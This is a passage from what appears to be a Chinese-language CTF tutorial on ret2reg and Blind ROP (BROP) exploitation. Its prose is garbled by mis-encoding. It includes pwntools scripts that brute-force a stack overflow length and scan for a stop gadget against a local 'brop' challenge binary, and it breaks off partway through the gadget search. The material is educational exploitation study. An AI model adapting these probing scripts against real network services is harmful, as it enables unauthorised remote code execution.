title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3></li><li>åˆ†æå’Œè°ƒè¯•æ±‡ç¼–ï¼ŒæŸ¥çœ‹æº¢å‡ºå‡½æ•°è¿”å›æ—¶å“ªä¸ªå¯„å­˜å™¨æŒ‡å‘ç¼“å†²åŒºåœ°å€</li><li>å‘å¯„å­˜å™¨æŒ‡å‘çš„ç¼“å†²åŒºä¸­æ³¨å…¥shellcode</li><li>æŸ¥æ‰¾call è¯¥å¯„å­˜å™¨æˆ–è€…jmp è¯¥å¯„å­˜å™¨æŒ‡ä»¤ï¼Œå¹¶å°†è¯¥æŒ‡ä»¤åœ°å€è¦†ç›–ret<h3 id="é˜²å¾¡æ–¹æ³•"><a href="#é˜²å¾¡æ–¹æ³•" class="headerlink" title="é˜²å¾¡æ–¹æ³•"></a>é˜²å¾¡æ–¹æ³•</h3>åœ¨å‡½æ•°retä¹‹å‰ï¼Œå°†æ‰€æœ‰èµ‹è¿‡å€¼çš„å¯„å­˜å™¨å…¨éƒ¨å¤ä½ï¼Œæ¸…0ï¼Œä»¥é¿å…æ­¤ç±»æ¼æ´</li></ul><h2 id="brop"><a href="#brop" class="headerlink" title="brop"></a>brop</h2><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p><strong>BROPå…¨ç§°ä¸ºâ€BlindROPâ€</strong>ï¼Œä¸€èˆ¬åœ¨æˆ‘ä»¬æ— æ³•è·å¾—äºŒè¿›åˆ¶æ–‡ä»¶çš„æƒ…å†µä¸‹åˆ©ç”¨ ROPè¿›è¡Œè¿œç¨‹æ”»å‡»æŸä¸ªåº”ç”¨ç¨‹åºï¼ŒåŠ«æŒè¯¥åº”ç”¨ç¨‹åºçš„æ§åˆ¶æµï¼Œ<strong>æˆ‘ä»¬å¯ä»¥ä¸éœ€è¦çŸ¥é“è¯¥åº”ç”¨ç¨‹åºçš„æºä»£ç æˆ–è€…ä»»ä½•äºŒè¿›åˆ¶ä»£ç </strong>ï¼Œè¯¥åº”ç”¨ç¨‹åºå¯ä»¥è¢«ç°æœ‰çš„ä¸€äº›ä¿æŠ¤æœºåˆ¶ï¼Œè¯¸å¦‚NX, ASLR, PIE, ä»¥åŠstack canariesç­‰ä¿æŠ¤ï¼Œåº”ç”¨ç¨‹åºæ‰€åœ¨çš„æœåŠ¡å™¨å¯ä»¥æ˜¯32ä½ç³»ç»Ÿæˆ–è€…64ä½ç³»ç»Ÿï¼ŒBROPè¿™ä¸€æ¦‚å¿µåœ¨2014å¹´ç”±Standfordçš„Andrea Bittauå‘è¡¨åœ¨Oakland 2014çš„è®ºæ–‡Hacking Blindä¸­æå‡ºã€‚</p><blockquote><p>è®ºæ–‡åœ°å€:<a href="https://www.scs.stanford.edu/brop/bittau-brop.pdf">bittau-brop.pdf</a></p></blockquote><h3 id="æ”»å‡»æ¡ä»¶"><a href="#æ”»å‡»æ¡ä»¶" class="headerlink" title="æ”»å‡»æ¡ä»¶"></a>æ”»å‡»æ¡ä»¶</h3><ol><li>ç¨‹åºå¿…é¡»å­˜åœ¨ä¸€ä¸ªå·²çŸ¥çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œå¹¶ä¸”æ”»å‡»è€…çŸ¥é“å¦‚ä½•è§¦å‘è¯¥æ¼æ´ï¼›</li><li>åº”ç”¨ç¨‹åºåœ¨crashä¹‹åå¯ä»¥é‡æ–°å¯åŠ¨ï¼ˆå¤æ´»ï¼‰ï¼Œå¹¶ä¸”é‡æ–°å¯åŠ¨ï¼ˆå¤æ´»ï¼‰çš„è¿›ç¨‹ä¸ä¼šè¢«re-rand(è™½ç„¶æœ‰ASLRçš„ä¿æŠ¤ï¼Œä½†æ˜¯å¤æ´»çš„è¿›ç¨‹å’Œä¹‹å‰çš„è¿›ç¨‹çš„åœ°å€éšæœºåŒ–æ˜¯ä¸€æ ·çš„)ï¼Œè¿™ä¸ªéœ€æ±‚å…¶å®åœ¨ç°å®ä¸­æ˜¯å­˜åœ¨ä¸”åˆç†çš„ï¼Œè¯¸å¦‚åƒå¦‚ä»Šçš„nginx, MySQL, Apache, OpenSSH, Sambaç­‰åº”ç”¨å‡ç¬¦åˆæ­¤ç±»ç‰¹æ€§ã€‚</li></ol><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ol><li>æš´åŠ›æšä¸¾ï¼Œè·å–æ ˆæº¢å‡ºé•¿åº¦ï¼Œå¦‚æœç¨‹åºå¼€å¯äº†Canary ï¼Œé¡ºä¾¿å°†canaryä¹Ÿå¯ä»¥çˆ†å‡ºæ¥</li><li>å¯»æ‰¾å¯ä»¥<strong>è¿”å›åˆ°ç¨‹åºmainå‡½æ•°çš„gadget</strong>,é€šå¸¸è¢«ç§°ä¸ºstop_gadget</li><li>åˆ©ç”¨stop_gadgetå¯»æ‰¾å¯åˆ©ç”¨(potentially useful)gadgetsï¼Œå¦‚:pop rdi; ret</li><li>å¯»æ‰¾BROP Gadgetï¼Œå¯èƒ½éœ€è¦è¯¸å¦‚writeã€putç­‰å‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨</li><li>å¯»æ‰¾ç›¸åº”çš„PLTåœ°å€</li><li>dumpè¿œç¨‹å†…å­˜ç©ºé—´<br>æ‹¿åˆ°ç›¸åº”çš„GOTå†…å®¹åï¼Œæ³„éœ²å‡ºlibcçš„å†…å­˜ä¿¡æ¯ï¼Œæœ€ååˆ©ç”¨ropå®Œæˆgetshell</li></ol><blockquote><p><strong>çŸ¥è¯†ç‚¹1-stop_gadget</strong>ï¼šä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¦‚æœæˆ‘ä»¬æŠŠæ ˆä¸Šçš„return addressè¦†ç›–æˆæŸäº›æˆ‘ä»¬éšæ„é€‰å–çš„å†…å­˜åœ°å€çš„è¯ï¼Œç¨‹åºæœ‰å¾ˆå¤§å¯èƒ½æ€§ä¼šæŒ‚æ‰ï¼ˆæ¯”å¦‚ï¼Œè¯¥return addressæŒ‡å‘äº†ä¸€æ®µä»£ç åŒºåŸŸï¼Œé‡Œé¢ä¼šæœ‰ä¸€äº›å¯¹ç©ºæŒ‡é’ˆçš„è®¿é—®é€ æˆç¨‹åºcrashï¼Œä»è€Œä½¿å¾—æ”»å‡»è€…çš„è¿æ¥ï¼ˆconnectionï¼‰è¢«å…³é—­ï¼‰ã€‚ä½†æ˜¯ï¼Œ<em>å­˜åœ¨å¦å¤–ä¸€ç§æƒ…å†µï¼Œå³è¯¥return addressæŒ‡å‘äº†ä¸€å—ä»£ç åŒºåŸŸï¼Œå½“ç¨‹åºçš„æ‰§è¡Œæµè·³åˆ°é‚£æ®µåŒºåŸŸä¹‹åï¼Œç¨‹åºå¹¶ä¸ä¼šcrashï¼Œè€Œæ˜¯è¿›å…¥äº†æ— é™å¾ªç¯ï¼Œè¿™æ—¶ç¨‹åºä»…ä»…æ˜¯hangåœ¨äº†é‚£é‡Œï¼Œæ”»å‡»è€…èƒ½å¤Ÿä¸€ç›´ä¿æŒè¿æ¥çŠ¶æ€</em>ã€‚äºæ˜¯ï¼Œæˆ‘ä»¬æŠŠè¿™ç§ç±»å‹çš„gadgetï¼Œæˆä¸º<strong><em>stop gadget</em></strong>ï¼Œè¿™ç§gadgetå¯¹äºå¯»æ‰¾å…¶ä»–gadgetså–åˆ°äº†è‡³å…³é‡è¦çš„ä½œç”¨ã€‚<br><strong>çŸ¥è¯†ç‚¹2-å¯åˆ©ç”¨çš„(potentially useful)gadgets</strong>ï¼šå‡è®¾ç°åœ¨æˆ‘ä»¬çŒœåˆ°æŸä¸ªuseful gadgetï¼Œæ¯”å¦‚pop rdi; ret, <em>ä½†æ˜¯ç”±äºåœ¨æ‰§è¡Œå®Œè¿™ä¸ªgadgetä¹‹åè¿›ç¨‹è¿˜ä¼šè·³åˆ°æ ˆä¸Šçš„ä¸‹ä¸€ä¸ªåœ°å€ï¼Œå¦‚æœè¯¥åœ°å€æ˜¯ä¸€ä¸ªéæ³•åœ°å€ï¼Œé‚£ä¹ˆè¿›ç¨‹æœ€åè¿˜æ˜¯ä¼šcrash</em>ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æ”»å‡»è€…å…¶å®å¹¶ä¸çŸ¥é“è¿™ä¸ªuseful gadgetè¢«æ‰§è¡Œè¿‡äº†ï¼ˆå› ä¸ºåœ¨æ”»å‡»è€…çœ‹æ¥æœ€åçš„æ•ˆæœéƒ½æ˜¯è¿›ç¨‹crashäº†ï¼‰ï¼Œå› æ­¤æ”»å‡»è€…å°±ä¼šè®¤ä¸ºåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰æ‰§è¡Œåˆ°ä»»ä½•çš„useful gadgetï¼Œä»è€Œæ”¾å¼ƒå®ƒã€‚è¿™ä¸ªæ­¥éª¤å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206185740.png" alt="Pasted image 20250206185740">ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬æœ‰äº†stop gadgetï¼Œé‚£ä¹ˆæ•´ä¸ªè¿‡ç¨‹å°†ä¼šå¾ˆä¸ä¸€æ ·. å¦‚æœæˆ‘ä»¬åœ¨éœ€è¦å°è¯•çš„return addressä¹‹åå¡«ä¸Šäº†è¶³å¤Ÿå¤šçš„stop gadgetsï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206185807.png" alt="Pasted image 20250206185807">é‚£ä¹ˆä»»ä½•ä¼šé€ æˆè¿›ç¨‹crashçš„gadgetæœ€åè¿˜æ˜¯ä¼šé€ æˆè¿›ç¨‹crashï¼Œè€Œé‚£äº›useful gadgetåˆ™ä¼šè¿›å…¥blockçŠ¶æ€ã€‚å°½ç®¡å¦‚æ­¤ï¼Œè¿˜æ˜¯æœ‰ä¸€ç§ç‰¹æ®Šæƒ…å†µï¼Œå³é‚£ä¸ªæˆ‘ä»¬éœ€è¦å°è¯•çš„gadgetä¹Ÿæ˜¯ä¸€ä¸ªstop gadgetï¼Œé‚£ä¹ˆå¦‚ä¸Šæ‰€è¿°ï¼Œå®ƒä¹Ÿä¼šè¢«æˆ‘ä»¬æ ‡è¯†ä¸ºuseful gadgetã€‚ä¸è¿‡è¿™å¹¶æ²¡æœ‰å…³ç³»ï¼Œå› ä¸ºä¹‹åæˆ‘ä»¬è¿˜æ˜¯éœ€è¦æ£€æŸ¥è¯¥useful gadgetæ˜¯å¦æ˜¯æˆ‘ä»¬æƒ³è¦çš„gadgetã€‚</p></blockquote><h3 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><p><a href="https://github.com/zszcr/ctfrepo/tree/master/BROP/hctf2016-brop-master">ctfrepo/BROP/hctf2016-brop-master at master Â· zszcr/ctfrepo</a></p><h4 id="è§£ç­”æ€è·¯"><a href="#è§£ç­”æ€è·¯" class="headerlink" title="è§£ç­”æ€è·¯"></a>è§£ç­”æ€è·¯</h4><p>åšé¢˜æ€è·¯ï¼šæ§åˆ¶putså‡½æ•°æ‰“å°å‡ºè‡ªèº«çš„gotè¡¨åœ°å€ï¼Œé€šè¿‡gotåœ°å€åˆ©ç”¨LibcSearcherè®¡ç®—å‡ºå½“å‰ä½¿ç”¨çš„libcç‰ˆæœ¬ï¼Œæ¥ç€æ‰¾åˆ°systemå‡½æ•°å’Œ/bin/shåœ°å€éƒ¨ç½²åˆ°æ ˆä¸­æ‰§è¡Œ</p><h4 id="è§£ç­”æ­¥éª¤"><a href="#è§£ç­”æ­¥éª¤" class="headerlink" title="è§£ç­”æ­¥éª¤"></a>è§£ç­”æ­¥éª¤</h4><h5 id="1-åˆ¤æ–­æ ˆæº¢å‡ºé•¿åº¦"><a href="#1-åˆ¤æ–­æ ˆæº¢å‡ºé•¿åº¦" class="headerlink" title="1.åˆ¤æ–­æ ˆæº¢å‡ºé•¿åº¦"></a>1.åˆ¤æ–­æ ˆæº¢å‡ºé•¿åº¦</h5><p>é¦–å…ˆç¬¬ä¸€æ­¥ï¼Œéœ€è¦å¯¹æ ˆç©ºé—´è¿›è¡Œåˆ¤æ–­ï¼Œç¡®å®šæ ˆæº¢å‡ºçš„é•¿åº¦ã€‚<br>åˆ¤æ–­æ ˆæº¢å‡ºå¯ä»¥é€šè¿‡å¾ªç¯ä¸æ–­çš„å¢åŠ è¾“å…¥å­—ç¬¦çš„é•¿åº¦ï¼Œç›´è‡³ç¨‹åºå´©æºƒ<br>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å‡ºç°â€™WelCome my friend,Do you know password?â€™è¿™ä¸ªå­—æ ·ä¹‹åç­‰å¾…è¾“å…¥ï¼Œå½“è¾“å…¥ä¸€ä¸ªaçš„æ—¶å€™ï¼Œæ¥ä¸‹æ¥ä¼šæç¤ºâ€™No password, no gameâ€™çš„å­—æ ·<br>åŒæ—¶åœ¨æˆ‘ä»¬è¾“å…¥ä¸€ä¸²ç‰¹åˆ«é•¿çš„å­—ç¬¦ä¸²çš„æ—¶å€™æ²¡æœ‰å‡ºç°â€™No password, no gameâ€™çš„å­—æ ·ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å¾ªç¯æ¥ä¸æ–­å¢åŠ å­—ç¬¦ä¸²é•¿åº¦ï¼Œå¹¶ä¸”æ ¹æ®å›æ˜¾ç»“æœä¸­æ˜¯å¦æœ‰â€™No password, no gameâ€™å­—æ ·æ¥åˆ¤æ–­åˆ°ä»€ä¹ˆé•¿åº¦è¦†ç›–äº†retè¿”å›åœ°å€ï¼Œå¹¶ä¸”<strong>è¯¥é•¿åº¦å‡ä¸€å°±æ˜¯æ ˆæº¢å‡ºçš„é•¿åº¦</strong></p><p><strong>å¾ªç¯å†…å®¹ï¼šç´¯åŠ è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦ï¼Œå¡«æ»¡æ ˆç©ºé—´</strong><br><strong>å¾ªç¯ç»ˆæ­¢æ¡ä»¶ï¼šå›æ˜¾ç»“æœèµ·å§‹ä½ç½®å­—ç¬¦ä¸²ä¸ºNo password, no game</strong><br><strong>æ‰§è¡Œç›®çš„ï¼šç¡®å®šæ ˆæº¢å‡ºé•¿åº¦ï¼Œä¸ºåç»­æ‰€æœ‰æ­¥éª¤åšå‡†å¤‡</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import*#æš´åŠ›æšä¸¾å‡ºæ ˆæº¢å‡ºé•¿åº¦def getsize():    i &#x3D; 1    while 1:        try:            p &#x3D; process(&#39;.&#x2F;brop&#39;)            p.recvuntil(&quot;WelCome my friend,Do you know password?\n&quot;)            p.send(i*&#39;a&#39;)            data &#x3D; p.recv()            p.close()            if not data.startswith(b&#39;No password&#39;):            #åˆ¤æ–­outputå˜é‡ä¸­èµ·å§‹ä½ç½®æ˜¯ä¸æ˜¯No passwordï¼Œå¦‚æœä¸æ˜¯è¯´æ˜å·²ç»æº¢å‡ºäº†                return i-1            else:                i+&#x3D;1        except EOFError:#ä¸»è¦æ¢æµ‹æ˜¯å¦å…·æœ‰canary            p.close()            return i-1 size &#x3D; getsize()print (&quot;size is : %s &quot;% size)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ ¹æ®ä¸Šé¢çš„ä»£ç å¯ä»¥ç¡®å®šæ ˆæº¢å‡ºçš„é•¿åº¦ä¸º72ï¼Œå¹¶ä¸”æ ¹æ®è¿”å›ä¿¡æ¯å‘ç°æ²¡æœ‰å¼€å¯canaryä¿æŠ¤<br>æ ˆä¸­æƒ…å†µï¼š<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">             +---------------------------+             |           ret             |              +---------------------------+             |            a              | é€’å¢aå­—ç¬¦ä¸²è¦†ç›–åŸsaved ebpä½ç½®      ebp---&gt;+---------------------------+             |            a+             | é€’å¢aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´             |           ....            |        .....             |            a+             | é€’å¢aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´             |            a+             | é€’å¢aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´             |            a+             | é€’å¢aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´             |            a+             | é€’å¢aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´ebp-ï¼Ÿ--&gt;+---------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h5 id="2-å¯»æ‰¾stop-gadget"><a href="#2-å¯»æ‰¾stop-gadget" class="headerlink" title="2.å¯»æ‰¾stop gadget"></a>2.å¯»æ‰¾stop gadget</h5><p>å½“æˆ‘ä»¬æƒ³åŠæ³•å¯»æ‰¾gadgetçš„æ—¶å€™ï¼Œå¹¶ä¸çŸ¥é“ç¨‹åºå…·ä½“æ˜¯ä»€ä¹ˆæ ·çš„ï¼Œæ‰€ä»¥éœ€è¦æ§åˆ¶è¿”å›åœ°å€è¿›è€Œå»çŒœæµ‹gadgetã€‚é‚£å½“æˆ‘ä»¬æ§åˆ¶è¿”å›åœ°å€æ—¶ï¼Œä¸€èˆ¬ä¼šå‡ºç°ä¸‰ç§æƒ…å†µ</p><ol><li>ç¨‹åºç›´æ¥å´©æºƒï¼šretåœ°å€æŒ‡å‘çš„æ˜¯ä¸€ä¸ªç¨‹åºå†…ä¸å­˜åœ¨çš„åœ°å€</li><li>ç¨‹åºè¿è¡Œä¸€æ®µæ—¶é—´åå´©æºƒï¼šæ¯”å¦‚è¿è¡Œè‡ªå·±æ„é€ çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°çš„è¿”å›åœ°å€æŒ‡å‘ä¸å­˜åœ¨çš„åœ°å€</li><li>ç¨‹åºä¸€ç›´è¿è¡Œè€Œä¸å´©æºƒ<br>stop gadgetä¸€èˆ¬æŒ‡çš„æ˜¯ï¼Œä½†ç¨‹åºæ‰§è¡Œè¿™æ®µä»£ç æ—¶ï¼Œç¨‹åºè¿›å…¥æ— é™å¾ªç¯ï¼Œè¿™æ ·ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿä¸€ç›´ä¿æŒè¿æ¥çŠ¶æ€ï¼Œå¹¶ä¸”ç¨‹åºä¸€ç›´è¿è¡Œè€Œä¸å´©æºƒã€‚å°±åƒè›‡åƒè‡ªå·±çš„å°¾å·´ä¸€æ ·ï¼Œstop gadgetæœ€åçš„retç»“å°¾åœ°å€å°±æ˜¯ç¨‹åºå¼€å¯çš„åœ°å€ï¼ˆæ¯”å¦‚mainå‡½æ•°åœ°å€ï¼‰</li></ol><p>ç”±äºçœ‹ä¸åˆ°äºŒè¿›åˆ¶ç¨‹åºæ‰€ä»¥ä¾ç„¶è¿˜éœ€è¦ä½¿ç”¨ç©·ä¸¾çš„æ–¹å¼ä¸æ–­çš„å°è¯•æ¯ä¸€ä¸ªåœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»åˆå§‹çš„åœ°å€0x400000å¼€å§‹ï¼Œé€šè¿‡å¾ªç¯ï¼Œä¸æ–­ç´¯åŠ åœ°å€è¿›è¡Œå°è¯•ï¼ˆå‰é¢æ£€æµ‹ç¨‹åºä¿æŠ¤è®²äº†ä¸ºä»€ä¹ˆåˆå§‹åœ°å€æ˜¯0x400000ï¼‰ã€‚æœ‰äº†å¾ªç¯ä¹‹åå°±éœ€è¦è€ƒè™‘å¾ªç¯ç»ˆæ­¢æ¡ä»¶ï¼Œç»ˆæ­¢æ¡ä»¶å¯ä»¥å‚è€ƒstop gadgetçš„ç‰¹æ€§ï¼Œåœ¨æ‰§è¡Œstop gadgetçš„æ—¶å€™ç¨‹åºä¼šå›åˆ°åˆå§‹çŠ¶æ€å¹¶ä¸”æ²¡æœ‰å‘ç”Ÿå´©æºƒã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹æ€§ï¼Œä½¿ç”¨å‰é¢æ‰¾åˆ°çš„72å­—èŠ‚å¡«æ»¡æ ˆç©ºé—´ï¼Œä¹‹åæ¥ä¸Šç©·ä¸¾çš„åœ°å€ï¼Œæ­¤æ—¶ç©·ä¸¾åœ°å€è¦†ç›–äº†retåœ°å€ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±ä¼šæ‰§è¡Œç©·ä¸¾åœ°å€ï¼Œå¦‚æœæ­¤æ—¶ç¨‹åºå‘ç”Ÿå´©æºƒå°±è¿›è¡Œä¸‹ä¸€æ¬¡å¾ªç¯ï¼Œå¦‚æœæ²¡æœ‰å´©æºƒåˆ™æ‰“å°è¯¥åœ°å€</p><p><strong>å¾ªç¯å†…å®¹ï¼šé€’å¢åœ°å€ï¼Œå°è¯•å¯èƒ½çš„stop gadget</strong><br><strong>å¾ªç¯ç»ˆæ­¢æ¡ä»¶ï¼šç¨‹åºä¸å‘ç”Ÿå´©æºƒ</strong><br><strong>æ‰§è¡Œç›®çš„ï¼šç¡®å®šstop gadgetä¸ºåé¢æŸ¥æ‰¾brop gadgetã€puts pltã€puts gotåšå‡†å¤‡</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import * def get_stop():    addr &#x3D; 0x400000    while 1:        sleep(0.1)        addr +&#x3D; 1        try:            print(&quot;Now,trying the address is &quot;,hex(addr))            p &#x3D; process(&#39;.&#x2F;brop&#39;)            p.recvuntil(b&quot;WelCome my friend,Do you know password?\n&quot;)            payload &#x3D; b&#39;a&#39;*72 + p64(addr)            print(&quot;Now,the payload is &quot;,payload)            p.sendline(payload)            data &#x3D; p.recv()            p.close()            if data.startswith(b&#39;WelCome&#39;):                print (&quot;main funciton--&gt;[%s]&quot;%hex(addr))                return addr            else:                print (&#39;one success addr : 0x%x&#39;%hex(addr))        except EOFError as e:            p.close()            print(&quot;a bad addr&quot;,hex(addr))        except:            print(&quot;Can&#39;t connect,retrying&quot;)            addr -&#x3D; 1 data &#x3D; get_stop()print (&quot;Success,call Main Function address is&quot;,hex(data))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206201043.png" alt="Pasted image 20250206201043"><br>æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨IDA(ä»…ä½œéªŒè¯ï¼Œbropç†åº”æ— æ–‡ä»¶)ï¼Œå¯çŸ¥è¯¥åœ°å€ä¸ºmainå‡½æ•°</p><h5 id="3-å¯»æ‰¾brop-gadget"><a href="#3-å¯»æ‰¾brop-gadget" class="headerlink" title="3.å¯»æ‰¾brop gadget"></a>3.å¯»æ‰¾brop gadget</h5><p>åœ¨å‰é¢æ‰¾åˆ°äº†stop gadgetæˆ‘ä»¬æ€ä¹ˆå»åˆ©ç”¨ä»–å‘¢ï¼Œè¿™æ—¶å€™å°±éœ€è¦æ‰¾åˆ°èƒ½å¤Ÿæ§åˆ¶å¯„å­˜å™¨çš„gadgetã€‚ç”±äºæˆ‘ä»¬çš„è®¡åˆ’æ˜¯åˆ©ç”¨putså‡½æ•°æ‰“å°å‡ºè‡ªå·±çš„gotåœ°å€ï¼Œé€šè¿‡gotåœ°å€æ‰¾åˆ°å¯¹åº”çš„libcç‰ˆæœ¬ï¼Œç„¶åæ‰¾åˆ°systemå‡½æ•°å’Œ/bin/shåœ°å€éƒ¨ç½²åˆ°æ ˆä¸­æ‰§è¡Œã€‚é‚£ä¹ˆéœ€è¦è€ƒè™‘çš„ä¸€ç‚¹æ˜¯åœ¨è°ƒç”¨putså‡½æ•°ä¹‹å‰éœ€è¦å°†æ‰“å°çš„å†…å®¹å‹è¿›rdiå¯„å­˜å™¨ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆå°±éœ€è¦é€šè¿‡gadgetæ¥æ§åˆ¶rdiå¯„å­˜å™¨ã€‚<br>å…¶å®åœ¨libc_csu_initçš„ç»“å°¾ä¸€é•¿ä¸²popçš„gadgetä¸­ï¼Œé€šè¿‡åç§»å¯ä»¥å¾—åˆ°pop rdiçš„æ“ä½œ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">+---------------------------+  |         pop rbx           |  0x00+---------------------------+|         pop rbp           |  0x01+---------------------------+|         pop r12           |  0x02+---------------------------+|         pop r13           |  0x04+---------------------------+|         pop r14           |  0x06+---------------------------+----------&gt;pop rsi;ret 0x07|         pop r15           |  0x08+---------------------------+----------&gt;pop rdi;ret 0x09|           ret             |  0x10-----------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°å¦‚æœä»¥pop rbxä¸ºåŸºåœ°å€çš„è¯å‘ä¸‹åç§»0x07ä¼šå¾—åˆ°pop rsiçš„æ“ä½œï¼Œå‘ä¸‹åç§»0x09ä¼šå¾—åˆ°pop rdiçš„æ“ä½œã€‚è¿™ä¸¤ä¸ªæ“ä½œå°±å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ§åˆ¶putså‡½æ•°çš„è¾“å‡ºå†…å®¹</p><p>é‚£ä¹ˆå¾€å›æƒ³æ—¢ç„¶æˆ‘ä»¬éœ€è¦ç”¨åˆ°pop rdiã€rsiçš„æ“ä½œå°±éœ€è¦çŸ¥é“libc_csu_initç»“å°¾6ä¸ªpopæ“ä½œçš„ä½ç½®ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬çš„stop gadgetå°±æ´¾ä¸Šç”¨åœºäº†ï¼Œä¸ºäº†æ›´å¥½åœ°æ¼”ç¤ºstop gadgetçš„ä½¿ç”¨ï¼Œè¿™é‡Œå®šä¹‰æ ˆä¸Šçš„ä¸‰ç§åœ°å€</p><ul><li>Probe - - æ¢é’ˆï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æƒ³è¦å¾ªç¯é€’å¢çš„ä»£ç åœ°å€ã€‚ä¸€èˆ¬æ¥è¯´éƒ½æ˜¯64ä½ç¨‹åºï¼Œå¯ä»¥ç›´æ¥ä»0x400000å°è¯•</li><li>Stop - - ä¸ä¼šä½¿å¾—ç¨‹åºå´©æºƒçš„stop gadgetçš„åœ°å€</li><li>Trap - - å¯ä»¥å¯¼è‡´ç¨‹åºå´©æºƒçš„åœ°å€</li></ul><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨æ ˆä¸Šæ‹œè®¿ä¸åŒç¨‹åºçš„Stopä¸Trapä»è€Œæ¥è¯†åˆ«å‡ºæ­£åœ¨æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œä¸¾å‡ ä¸ªä¾‹å­</p><ul><li>probe, stop, traps, (traps, traps, â€¦)ä»¥è¿™æ ·çš„æ–¹å¼è¿›è¡Œæ’åˆ—ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹åœ¨æ ˆä¸­çš„æ’åˆ—<pre class="line-numbers language-python" data-language="python"><code class="language-python">+---------------------------+ |          traps            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ+---------------------------+|           ....            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ+---------------------------+|          traps            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ+---------------------------+|          traps            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ+---------------------------+|          traps            |&lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ+---------------------------+|          stop             |&lt;----- stop gadgetï¼Œä¸ä¼šä½¿ç¨‹åºå´©æºƒï¼Œä½œä¸ºprobeçš„retä½+---------------------------+|          probe            |&lt;----- æ¢é’ˆ-----------------------------<span aria-hidden="true" 